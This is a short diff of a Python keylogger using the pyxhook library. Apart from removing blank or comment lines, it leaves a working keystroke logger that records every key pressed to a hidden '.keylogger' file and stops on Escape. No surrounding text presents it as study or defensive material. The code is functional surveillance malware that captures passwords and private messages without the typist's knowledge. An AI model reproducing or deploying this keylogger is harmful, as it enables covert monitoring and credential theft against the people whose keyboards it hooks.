@@ -1,18 +1,13 @@
 
-                                                 
-                                                      
-                                         
 
 import pyxhook
 import time
 
-                                                      
 def newline():
 	file = open('.keylogger', 'a')
 	file.write('\n')
 	file.close()
 
-                                                     
 def key_press_event(event):
     global running
                                        
@@ -20,11 +15,9 @@ def key_press_event(event):
 	    with open('.keylogger', 'a+') as File:
 	    	File.write(event.Key)
 
-                                                                    
     if event.Key == 'space':
         newline()
 
-                                                                 
     if event.Key == 'Escape':
         running = False
         newline()
@@ -39,10 +32,8 @@ if __name__ == '__main__':
                      
 	hookman.start()
 
-                                                
 	running = True
 	while running:
 	    time.sleep(0.1)
 
-                                      
 	hookman.cancel()
